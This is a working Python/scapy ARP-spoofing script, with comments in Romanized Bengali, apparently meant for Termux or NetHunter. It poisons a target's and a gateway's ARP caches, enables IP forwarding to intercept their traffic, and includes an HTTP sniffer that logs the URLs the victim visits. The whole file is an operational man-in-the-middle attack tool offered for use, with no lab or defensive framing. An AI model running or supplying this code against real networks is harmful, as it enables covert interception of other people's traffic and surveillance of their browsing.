import scapy.all as scapy
from scapy.layers import http
import time
import os

# Terminal screen clear korar jonno
os.system("clear")

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def sniff(interface):
    # Target ki browse korche seta dekhbe
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
        print(f"[!] Target visited: {url.decode()}")

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)

# Main Program
target_ip = input("Enter Target IP: ")
gateway_ip = input("Enter Router/Gateway IP: ")
iface = "wlan0" # Termux/NetHunter er default wifi interface

try:
    print("\n[*] IP Forwarding Enable kora hochhe...")
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    
    print("[+] Attack Started... Press Ctrl+C to Stop.")
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        # Packet sniffing functionality call (Optional)
        # sniff(iface) 
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[-] Stopping and Restoring Network...")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
